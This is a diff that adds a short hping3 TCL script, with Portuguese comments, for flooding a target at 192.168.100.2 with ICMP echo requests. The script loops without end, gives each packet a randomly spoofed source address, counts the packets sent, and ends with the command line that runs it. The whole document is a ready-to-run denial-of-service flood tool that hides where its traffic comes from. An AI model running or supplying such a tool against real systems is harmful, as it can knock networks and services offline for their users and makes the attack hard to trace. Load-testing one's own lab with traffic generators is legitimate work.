@@ -1,0 +1,24 @@
+# Hping3 Echo Flood with TCL script
+# ICMP Echo-Request Flood (rand source, ttl=64, payload=0) for hping3 TCL mode
+
+set dst_ip "192.168.100.2"
+set count 0
+
+# Função para gerar IP randômico
+proc random_ip {} {
+    return "[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}]"
+}
+
+while {1} {
+    set saddr [random_ip]
+    # Pacote ICMP Echo Request (type 8, code 0), TTL=64, payload vazio
+    set pkt "ip(saddr=$saddr,daddr=$dst_ip,ttl=64)+icmp(type=8,code=0)"
+    hping send $pkt
+    incr count
+    # Imprime a cada 1000 pacotes enviados
+    if {[expr {$count % 1000}] == 0} {
+        puts "$count Echo-Request packets sent so far..."
+    }
+}
+
+# sudo hping3 exec icmp_flood_echo_TCL.htcl
